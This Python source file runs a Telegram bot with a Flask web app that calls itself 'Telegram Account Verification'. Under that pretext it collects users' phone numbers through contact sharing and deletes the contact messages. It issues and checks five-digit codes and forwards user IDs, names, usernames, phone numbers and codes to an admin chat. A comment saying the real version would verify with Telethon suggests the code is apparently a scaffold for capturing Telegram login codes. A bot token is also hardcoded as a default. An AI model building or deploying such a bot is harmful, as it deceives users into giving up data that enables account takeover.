import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time
import json
import urllib.parse

# ==================== SETUP ====================
# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://itz-me-545-telegram.onrender.com")

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage
user_sessions = {}
session_timeout = 600  # 10 minutes

# ==================== SESSION MANAGEMENT ====================
def create_user_session(user_id, telegram_user=None):
    """Create a new user session"""
    user_sessions[user_id] = {
        'user_id': user_id,
        'created': datetime.now(),
        'status': 'waiting',
        'phone': None,
        'telegram_user': telegram_user,
        'otp_sent': False,
        'otp_code': None,
        'otp_verified': False,
        'last_activity': datetime.now(),
        'contact_received_at': None,
        'otp_sent_at': None,
        'verified_at': None
    }
    logger.info(f"✅ Created session for user {user_id}")
    return user_sessions[user_id]

def get_user_session(user_id):
    """Get user session if valid"""
    if user_id in user_sessions:
        session = user_sessions[user_id]
        
        # Check if session expired
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            logger.info(f"🗑️ Session expired for user {user_id}")
            del user_sessions[user_id]
            return None
        
        # Update last activity
        session['last_activity'] = datetime.now()
        return session
    return None

def get_or_create_session(user_id, telegram_user=None):
    """Get existing session or create new one"""
    session = get_user_session(user_id)
    if not session:
        session = create_user_session(user_id, telegram_user)
    return session

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    try:
        user_id = None
        telegram_user = None
        
        # Method 1: Try to get from Telegram WebApp initData
        init_data = request.args.get('tgWebAppData', '') or request.args.get('initData', '')
        
        if init_data:
            try:
                # Parse the initData
                logger.info(f"📱 Got initData from Telegram WebApp")
                
                # Decode URL parameters
                parsed_data = urllib.parse.parse_qs(urllib.parse.unquote(init_data))
                
                # Extract user data
                if 'user' in parsed_data:
                    user_json = parsed_data['user'][0]
                    user_obj = json.loads(user_json)
                    user_id = str(user_obj.get('id'))
                    telegram_user = user_obj
                    logger.info(f"✅ Extracted user ID from WebApp: {user_id}")
            except Exception as e:
                logger.error(f"❌ Error parsing initData: {e}")
        
        # Method 2: Fallback to URL parameter
        if not user_id:
            user_id = request.args.get('user_id')
            if user_id:
                logger.info(f"🌐 Using user_id from URL: {user_id}")
        
        # Method 3: Try to get from referrer or Telegram headers
        if not user_id:
            # Check for Telegram WebApp referrer
            referrer = request.headers.get('Referer', '')
            if 't.me' in referrer or 'telegram' in referrer.lower():
                logger.info("🔍 Telegram referrer detected but no user_id")
        
        if user_id:
            # Create or get session
            session = get_or_create_session(user_id, telegram_user)
            
            if session:
                # Update Telegram user info
                if telegram_user and not session.get('telegram_user'):
                    session['telegram_user'] = telegram_user
                
                # Check if OTP already sent
                if session.get('otp_sent') and session.get('phone'):
                    return render_template('otp.html',
                                         user_id=user_id,
                                         phone=session['phone'],
                                         bot_username=BOT_USERNAME)
                
                # Get user display name
                user_display = "User"
                if telegram_user:
                    user_display = telegram_user.get('first_name', '') or telegram_user.get('username', '') or 'User'
                elif session.get('telegram_user'):
                    tg_user = session['telegram_user']
                    user_display = tg_user.get('first_name', '') or tg_user.get('username', '') or 'User'
                
                return render_template('index.html',
                                     user_id=user_id,
                                     user_display=user_display,
                                     bot_username=BOT_USERNAME,
                                     webapp_url=WEBAPP_URL)
        
        # No user ID - show error
        return render_template('index.html',
                             user_id='',
                             user_display='Guest',
                             bot_username=BOT_USERNAME,
                             webapp_url=WEBAPP_URL,
                             error="Please open from Telegram bot")
                             
    except Exception as e:
        logger.error(f"❌ Error in index route: {e}")
        return render_template('error.html',
                             error="System Error",
                             message="Please try again",
                             bot_username=BOT_USERNAME)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    user_id = request.args.get('user_id')
    
    if not user_id:
        return render_template('error.html',
                             error="User ID not found",
                             message="Please open from Telegram bot.",
                             bot_username=BOT_USERNAME)
    
    session = get_user_session(user_id)
    if not session:
        # Try to create session if doesn't exist
        session = create_user_session(user_id)
    
    phone = session.get('phone', 'Unknown')
    return render_template('otp.html',
                         user_id=user_id,
                         phone=phone,
                         bot_username=BOT_USERNAME)

@app.route('/api/check-session', methods=['POST'])
def check_session():
    """Check if session exists"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        session = get_user_session(user_id)
        if not session:
            # Create a new session if doesn't exist
            session = create_user_session(user_id)
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'status': session['status'],
            'exists': True,
            'phone': session.get('phone'),
            'otp_sent': session.get('otp_sent', False)
        })
        
    except Exception as e:
        logger.error(f"Error checking session: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/start-verification', methods=['POST'])
def start_verification():
    """Start verification process"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        # Get or create session
        session = get_or_create_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Failed to create session'})
        
        # Update session status
        session['status'] = 'verification_started'
        session['verification_started_at'] = datetime.now()
        
        return jsonify({
            'success': True,
            'message': 'Verification started successfully!',
            'instructions': f"""To complete verification:

1. 📱 Go back to Telegram chat with @{BOT_USERNAME}
2. 📎 Tap the attachment button
3. 👤 Select "Contact"
4. ✅ Choose your contact
5. 🚀 Send it to the bot

✅ Your contact will be auto-deleted immediately
✅ OTP will be sent automatically
✅ Come back here after sending""",
            'user_id': user_id
        })
        
    except Exception as e:
        logger.error(f"Error starting verification: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        if not otp or len(otp) != 5:
            return jsonify({'success': False, 'error': 'Invalid OTP format (5 digits required)'})
        
        session = get_user_session(user_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        # Check if OTP matches (in real app, verify with Telethon)
        stored_otp = session.get('otp_code')
        if stored_otp and otp == stored_otp:
            session['otp_verified'] = True
            session['status'] = 'verified'
            session['verified_at'] = datetime.now()
            
            # Send notification
            try:
                phone = session.get('phone', 'Unknown')
                admin_msg = f"""✅ <b>VERIFICATION SUCCESSFUL</b>

🆔 User ID: {user_id}
📱 Phone: {phone}
🔢 OTP: {otp}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp"""
                
                # Send to admin if configured
                admin_id = os.environ.get("ADMIN_ID")
                if admin_id:
                    bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
            except:
                pass
            
            return jsonify({
                'success': True,
                'message': '✅ OTP verified successfully!'
            })
        else:
            return jsonify({'success': False, 'error': 'Invalid OTP code'})
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create Telegram user object
        telegram_user = {
            'id': user_id,
            'first_name': first_name,
            'username': username,
            'language_code': message.from_user.language_code
        }
        
        # Create or get session
        session = get_or_create_session(user_id, telegram_user)
        
        # Create WebApp URL with user_id
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/?user_id={user_id}"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="📱 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""<b>🔐 Telegram Account Verification</b>

Hello {first_name}! 👋

Click the button below to open the WebApp and verify your Telegram account.

<b>How it works:</b>
1. Open WebApp
2. Follow instructions to share contact
3. Receive OTP on your phone
4. Enter OTP in WebApp
5. Verification complete! ✅

⚠️ <b>Important:</b> Your contact will be auto-deleted immediately for privacy.

<b>Bot:</b> @{BOT_USERNAME}"""
        
        # Send message
        sent_msg = bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ WebApp button sent to {user_id}")
        
        # Send admin notification
        try:
            admin_id = os.environ.get("ADMIN_ID")
            if admin_id:
                admin_msg = f"""👤 <b>NEW USER STARTED</b>

🆔 User ID: <code>{user_id}</code>
👤 Name: {first_name}
🔗 Username: @{username}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 WebApp: {webapp_url}"""
                
                bot.send_message(int(admin_id), admin_msg, parse_mode='HTML')
        except Exception as e:
            logger.error(f"Admin notification error: {e}")
        
    except Exception as e:
        logger.error(f"❌ Error in /start handler: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle shared contact"""
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        
        if not message.contact:
            bot.send_message(chat_id, "⚠️ Please share a valid contact.")
            return
        
        contact = message.contact
        phone = contact.phone_number
        first_name = contact.first_name or ""
        last_name = contact.last_name or ""
        
        logger.info(f"📞 Contact received from {user_id}: {phone}")
        
        # Get or create session
        session = get_or_create_session(user_id)
        
        # Update session
        session['phone'] = phone
        session['contact_name'] = f"{first_name} {last_name}".strip()
        session['contact_received_at'] = datetime.now()
        session['status'] = 'contact_received'
        
        # Delete contact message
        try:
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"🗑️ Deleted contact message for {user_id}")
        except:
            logger.warning("Could not delete message")
        
        # Generate OTP
        import random
        otp_code = str(random.randint(10000, 99999))
        session['otp_code'] = otp_code
        session['otp_sent'] = True
        session['otp_sent_at'] = datetime.now()
        session['status'] = 'otp_sent'
        
        # Send OTP message
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/otp?user_id={user_id}"
        
        otp_message = f"""✅ <b>OTP Sent Successfully!</b>

📱 Phone: <code>{phone}</code>
👤 Name: {first_name} {last_name}

🔢 <b>Your OTP Code:</b> <code>{otp_code}</code>

📨 This OTP has been sent to your phone.

<b>Next Steps:</b>
1. Return to WebApp
2. Enter the OTP code
3. Complete verification

<a href="{webapp_url}">Click here to enter OTP</a>

Or send /start to get WebApp link again."""
        
        bot.send_message(
            chat_id,
            otp_message,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
        
        logger.info(f"✅ OTP sent to {user_id}: {otp_code}")
        
    except Exception as e:
        logger.error(f"❌ Error handling contact: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        user_id = str(message.from_user.id)
        text = message.text or ""
        
        # Ignore commands
        if text.startswith('/'):
            return
        
        logger.info(f"💬 Message from {user_id}: {text[:50]}...")
        
        # Check session
        session = get_user_session(user_id)
        
        if session and session.get('otp_sent'):
            webapp_url = f"{WEBAPP_URL.rstrip('/')}/otp?user_id={user_id}"
            response = f"""🔐 <b>Verification in Progress</b>

Your verification is already started.

📱 Phone: {session.get('phone', 'Not shared yet')}
📨 OTP Status: {'Sent' if session.get('otp_sent') else 'Not sent'}

<a href="{webapp_url}">Click here to enter OTP</a>

Or send /start to restart."""
        else:
            response = f"""<b>📋 Welcome!</b>

To start verification, send:
/start - Open verification WebApp

<b>How it works:</b>
1. Send /start
2. Open WebApp
3. Share contact
4. Enter OTP
5. Complete verification

<b>Bot:</b> @{BOT_USERNAME}"""
        
        bot.send_message(message.chat.id, response, parse_mode='HTML', disable_web_page_preview=True)
        
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== BOT POLLING (FIXED) ====================
def start_bot_polling():
    """Start bot polling with error recovery"""
    logger.info("🚀 Starting bot polling...")
    
    while True:
        try:
            logger.info("🔄 Bot polling started")
            
            # Remove any existing webhook
            bot.remove_webhook()
            time.sleep(0.1)
            
            # Start polling
            bot.polling(
                none_stop=True,        # Don't stop on errors
                interval=1,            # Check every second
                timeout=30,            # Long polling timeout
                long_polling_timeout=30
            )
            
        except telebot.apihelper.ApiTelegramException as api_error:
            if "Conflict" in str(api_error):
                logger.error("❌ Another bot instance is running. Exiting...")
                break
            else:
                logger.error(f"❌ Telegram API error: {api_error}")
                time.sleep(5)
                
        except Exception as e:
            logger.error(f"❌ Bot polling error: {e}")
            logger.info("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_users = []
            
            for user_id, session in user_sessions.items():
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_sessions[user_id]
                logger.info(f"🧹 Cleaned expired session: {user_id}")
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Error in cleanup thread: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Print startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM WEBAPP VERIFICATION BOT")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
    logger.info("="*50)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
    bot_thread.start()
    logger.info("✅ Bot polling thread started")
    
    # Run Flask app
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting Flask on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
    )
